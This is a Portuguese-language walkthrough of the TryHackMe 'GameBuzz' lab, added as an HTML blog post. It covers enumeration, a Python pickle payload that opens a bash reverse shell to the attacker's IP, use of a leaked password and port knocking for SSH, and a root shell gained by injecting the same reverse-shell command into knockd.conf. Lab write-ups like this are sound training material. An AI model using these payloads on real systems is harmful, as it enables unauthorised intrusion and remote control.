@@ -1,0 +1,324 @@
+<p><img src="/img/thm/thm-gamebuzz-logo.png" /></p>
+
+<p><br /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Nome</th>
+      <th><a href="https://tryhackme.com/room/gamebuzz">GameBuzz</a></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>OS</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Nível</td>
+      <td>Hard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<h2 id="recon">RECON</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.102.61 <span class="nt">--min-rate</span><span class="o">=</span>512
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Incognito
+
+</code></pre></div></div>
+
+<p>O nmap nos trouxe somente a porta 80 aberta e a porta 22 com algum bloqueio, que ainda não sabemos o tipo, então o vetor de entrada será pelo website.</p>
+
+<h3 id="porta-80">Porta 80</h3>
+
+<p><img src="/img/thm/thm-gamebuzz-1.png" /></p>
+
+<p>Encontramos uma página sobre games. Ao analisar a página, encontrei uma informação relevante nos contatos, o email <code class="language-plaintext highlighter-rouge">admin@incognito.com</code>, o que significa que teremos que adicionar o domínio em <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p>Enumerando a página, encontramos um único link funcional <code class="language-plaintext highlighter-rouge">Game Ratings</code> que traz informações sobre três jogos diferentes.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-2.png" /></p>
+
+<p>Decidi analizar a requisição com o <code class="language-plaintext highlighter-rouge">BURP</code>.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-3.png" /></p>
+
+<p>Aparentemente o link faz uma requisição para um objeto <code class="language-plaintext highlighter-rouge">serializado</code> que se encontra  no endereço <code class="language-plaintext highlighter-rouge">/var/upload/games/</code>, talvez possamos utilizar um payload serializado, mas ainda não temos um vetor de entrada.</p>
+
+<p>A varredura de diretórios não revelou nada útil, então decidi fazer uma busca por subdomínios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span>gobuster dns <span class="nt">-d</span> incognito.com <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Domain:     incognito.com
+<span class="o">[</span>+] Threads:    10
+<span class="o">[</span>+] Timeout:    1s
+<span class="o">[</span>+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+<span class="o">===============================================================</span>
+2021/09/12 22:40:02 Starting gobuster <span class="k">in </span>DNS enumeration mode
+<span class="o">===============================================================</span>
+Found: autodiscover.incognito.com
+Found: dev.incognito.com         
+Found: www.incognito.com         
+Found: blog.incognito.com        
+Found: ns2.incognito.com         
+Found: old.incognito.com         
+Found: ns3.incognito.com         
+Found: support.incognito.com     
+Found: demo.incognito.com        
+Found: ns4.incognito.com         
+Found: video.incognito.com       
+Found: api.incognito.com         
+Found: staging.incognito.com     
+Found: sip.incognito.com         
+Found: info.incognito.com        
+Found: help.incognito.com        
+Found: www4.incognito.com        
+Found: docs.incognito.com        
+Found: nagios.incognito.com      
+Found: access.incognito.com      
+Found: dl.incognito.com          
+Found: lyncdiscover.incognito.com
+Found: jira.incognito.com        
+Found: www6.incognito.com        
+Found: go.incognito.com          
+Found: calendar.incognito.com    
+Found: assets.incognito.com      
+Found: pbx.incognito.com 
+Found: sites.incognito.com       
+Found: is.incognito.com          
+Found: repository.incognito.com  
+Found: groups.incognito.com      
+Found: stun.incognito.com        
+Found: ice.incognito.com         
+Found: sbc.incognito.com         
+Found: metis.incognito.com       
+Found: calypso.incognito.com     
+Found: prometheus.incognito.com  
+</code></pre></div></div>
+<p>A busca trouxe vários subdomínios, mas o mais interessante pareceu <code class="language-plaintext highlighter-rouge">dev.incognito.com</code>, depois de adicioná-lo em <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, acessei a página.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-4.png" /></p>
+
+<p>Encontramos uma página permitida somente para desenvolvedores, ao checar a existência do <code class="language-plaintext highlighter-rouge">/robots.txt</code>, encontrei um diretório desabilitado.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-5.png" /></p>
+
+<p>Ao acessar a página, obtive a resposta de diretório proibido pelo servidor.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-6.png" /></p>
+
+<p>Porém, como encontrei como desabilitado no robots.txt, decidi fazer uma varredura de diretórios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-e</span> <span class="nt">-u</span> http://dev.incognito.com/secret/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-r</span> 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://dev.incognito.com/secret/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 10
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Follow Redirect:         <span class="nb">true</span>
+<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/09/12 22:47:04 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+http://dev.incognito.com/secret/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 282]
+http://dev.incognito.com/secret/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 282]
+http://dev.incognito.com/secret/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 282]
+http://dev.incognito.com/secret/upload               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 370]
+                                                                              
+<span class="o">===============================================================</span>
+2021/09/12 22:49:28 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>O gobuster trouxe o diretório <code class="language-plaintext highlighter-rouge">/upload</code>, ao acessá-lo, encontrei um formulário de upload.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-7.png" /></p>
+
+<p>Como o diretório é <code class="language-plaintext highlighter-rouge">/upload</code> e a requisição do <code class="language-plaintext highlighter-rouge">Game Ratings</code> vai para o diretório <code class="language-plaintext highlighter-rouge">/var/upload/games</code>, tavlez estejamos falando do mesmo lugar, então decidi fazer um script em <code class="language-plaintext highlighter-rouge">python</code> para serializar um payload com reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span><span class="nb">cat </span>serialize.py 
+<span class="c">#!/usr/bin/python3</span>
+
+import pickle, os
+
+class SerializedPickle<span class="o">(</span>object<span class="o">)</span>:
+    def __reduce__<span class="o">(</span>self<span class="o">)</span>:
+        <span class="k">return</span><span class="o">(</span>os.system,<span class="o">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.9.0.44/8443 0&gt;&amp;1'"</span>,<span class="o">))</span>
+
+pickle.dump<span class="o">(</span>SerializedPickle<span class="o">()</span>, open<span class="o">(</span><span class="s1">'hastur'</span>,<span class="s1">'wb'</span><span class="o">))</span>
+</code></pre></div></div>
+<p>Este script irá salvar nosso payload em um arquivo para podermos subí-lo pelo formulário.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span>python3 serialize.py               
+                                                                                                                     
+┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x  2 hastur hastur 4096 Sep 12 22:56 <span class="nb">.</span>
+drwxr-xr-x 33 hastur hastur 4096 Sep 12 22:48 ..
+<span class="nt">-rw-r--r--</span>  1 hastur hastur   87 Sep 12 22:56 hastur
+<span class="nt">-rw-r--r--</span>  1 hastur hastur  236 Sep 12 22:54 serialize.py
+</code></pre></div></div>
+
+<p>Setei um <code class="language-plaintext highlighter-rouge">netcat</code> para ouvir na porta 8443 e fiz upload do payload.
+Com o <code class="language-plaintext highlighter-rouge">BURP</code>, alterei a requisição do <code class="language-plaintext highlighter-rouge">Game Rating</code> para o endereço do payload.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-8.png" /></p>
+
+<p>Ao enviar a requisição alterada, conseguimos nosso shell!!</p>
+
+<p><img src="/img/thm/thm-gamebuzz-9.png" /></p>
+
+<p>Ao enumerar o diretório <code class="language-plaintext highlighter-rouge">/home</code>, encontramos dois usuários.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@incognito:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x  4 root root 4096 Mar  1  2021 <span class="nb">.</span>
+drwxr-xr-x 24 root root 4096 Aug 11 07:56 ..
+drwxr-x---  7 dev1 dev1 4096 Jun 11 08:55 dev1
+drwxr-xr-x  6 dev2 dev2 4096 Jun 11 07:24 dev2
+</code></pre></div></div>
+<p>Ao tentar mudar para o usuário <code class="language-plaintext highlighter-rouge">dev2</code>, conseguimos sem uso de senha.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@incognito:/home<span class="nv">$ </span>su dev2
+su dev2
+dev2@incognito:/home<span class="nv">$ </span>
+</code></pre></div></div>
+<p>A flag <code class="language-plaintext highlighter-rouge">user.txt</code> se encontra no diretório do usuário dev2.</p>
+
+<p>Após um tempo de enumeração local, encontrei um e-mail direcionado para o usuário <code class="language-plaintext highlighter-rouge">dev1</code> em <code class="language-plaintext highlighter-rouge">/var/mail</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev2@incognito:/var/mail<span class="nv">$ </span><span class="nb">cat </span>dev1
+<span class="nb">cat </span>dev1
+Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
+Knock yourself <span class="k">in</span><span class="o">!</span>
+</code></pre></div></div>
+<p>Esta mensagem diz que a senha do usuário dev1 foi alterada para a senha informada, porém a porta 22 está bloqueada por algum serviço. Também finaliza com a frase <code class="language-plaintext highlighter-rouge">Knock yourself in!</code>, o que pode dizer que a porta 22 pode estar protegida por um serviço de <code class="language-plaintext highlighter-rouge">Port Knocking</code>.</p>
+
+<p>Ao enumerar o diretório <code class="language-plaintext highlighter-rouge">/etc</code>, encontrei o arquivo <code class="language-plaintext highlighter-rouge">knockd.conf</code>, ao ler o conteúdo, encontrei a configuração do Port Knocking.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev2@incognito:/etc<span class="nv">$ </span><span class="nb">cat </span>knockd.conf
+<span class="nb">cat </span>knockd.conf
+<span class="o">[</span>options]
+        logfile <span class="o">=</span> /var/log/knockd.log
+
+<span class="o">[</span>openSSH]
+        sequence    <span class="o">=</span> 5020,6120,7340
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
+        tcpflags    <span class="o">=</span> syn
+
+<span class="o">[</span>closeSSH]
+        sequence    <span class="o">=</span> 9000,8000,7000
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> REJECT
+        tcpflags    <span class="o">=</span> syn
+</code></pre></div></div>
+<p>Ele nos diz que para abrir a porta 22, precisamos mandar uma requisição sequencial com a flag <code class="language-plaintext highlighter-rouge">SYN</code> para as portas <code class="language-plaintext highlighter-rouge">5020, 6120 e 7340</code>, podemos usar o programa <code class="language-plaintext highlighter-rouge">knock</code> para abrirmos a porta 22 e tentar logar com o usuário <code class="language-plaintext highlighter-rouge">dev1</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/GameBuzz]
+└─<span class="nv">$ </span>knock 10.10.102.61 5020 6120 7340 <span class="nt">-d</span> 500
+</code></pre></div></div>
+
+<p>E logo em seguida tentei a conexão <code class="language-plaintext highlighter-rouge">ssh</code> e consegui o shell.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-10.png" /></p>
+
+<h2 id="escalação-de-privilégios">Escalação de privilégios</h2>
+
+<p>Ao enumerar as permissões do usuário dev1, descobri que ele tem permissão administrativa para inicializar o programa <code class="language-plaintext highlighter-rouge">konckd</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev1@incognito:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>dev1: 
+Matching Defaults entries <span class="k">for </span>dev1 on incognito:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User dev1 may run the following commands on incognito:
+    <span class="o">(</span>root<span class="o">)</span> /etc/init.d/knockd
+</code></pre></div></div>
+<p>Ao enumerar o arquivo <code class="language-plaintext highlighter-rouge">/etc/knockd.conf</code> que já havíamos encontrado, descobri que ele tem permissões adicionais.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev1@incognito:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/knockd.conf 
+<span class="nt">-rw-rw-r--</span>+ 1 root root 349 Jun 11 07:39 /etc/knockd.conf
+</code></pre></div></div>
+<p>O <code class="language-plaintext highlighter-rouge">+</code> nas permissões, evidencia que o arquivo tem permissões especiais, se conseguirmos editar este arquivo, podemos tentar um shell como <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev1@incognito:~<span class="nv">$ </span><span class="nb">cat</span> /etc/knockd.conf 
+<span class="o">[</span>options]
+        logfile <span class="o">=</span> /var/log/knockd.log
+
+<span class="o">[</span>openSSH]
+        sequence    <span class="o">=</span> 5020,6120,7340
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> ACCEPT
+        tcpflags    <span class="o">=</span> syn
+
+<span class="o">[</span>closeSSH]
+        sequence    <span class="o">=</span> 9000,8000,7000
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> REJECT
+        tcpflags    <span class="o">=</span> syn
+</code></pre></div></div>
+<p>Novamente observando o arquivo, percebemos que logo após ele receber a sequência correta de requisições, ele roda um comando no <code class="language-plaintext highlighter-rouge">iptables</code>, iso significa que talvez possamos editar esta linha para inserir um payload de conexão reversa.
+Após a edição do arquivo, ficou desta forma :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev1@incognito:~<span class="nv">$ </span><span class="nb">cat</span> /etc/knockd.conf 
+<span class="o">[</span>options]
+        logfile <span class="o">=</span> /var/log/knockd.log
+
+<span class="o">[</span>openSSH]
+        sequence    <span class="o">=</span> 5020,6120,7340
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.9.0.44/8443 0&gt;&amp;1'</span>
+        tcpflags    <span class="o">=</span> syn
+
+<span class="o">[</span>closeSSH]
+        sequence    <span class="o">=</span> 9000,8000,7000
+        seq_timeout <span class="o">=</span> 15
+        <span class="nb">command</span>     <span class="o">=</span> /sbin/iptables <span class="nt">-I</span> INPUT <span class="nt">-s</span> %IP% <span class="nt">-p</span> tcp <span class="nt">--dport</span> 22 <span class="nt">-j</span> REJECT
+        tcpflags    <span class="o">=</span> syn
+</code></pre></div></div>
+<p>Após a edição, utilizei a permissão do usuário dev1 para reiniciar o knockd e recarregar as configurações.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dev1@incognito:~<span class="nv">$ </span><span class="nb">sudo</span> /etc/init.d/knockd restart
+<span class="o">[</span> ok <span class="o">]</span> Restarting knockd <span class="o">(</span>via systemctl<span class="o">)</span>: knockd.service.
+</code></pre></div></div>
+
+<p>Depois disso, tudo que precisei fazer foi setar um <code class="language-plaintext highlighter-rouge">netcat</code> na porta 8443 e fazer o knocking novamente.</p>
+
+<p><img src="/img/thm/thm-gamebuzz-11.png" /></p>
+
+<p>E consegui o shell <code class="language-plaintext highlighter-rouge">root</code>!!
+A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no diretório <code class="language-plaintext highlighter-rouge">/root</code>.</p>
+
+<p><br /></p>
+
+<p>E comprometemos o server!!
+<br /></p>
+
+<p><img src="/htb/hackerman.gif" /></p>
+
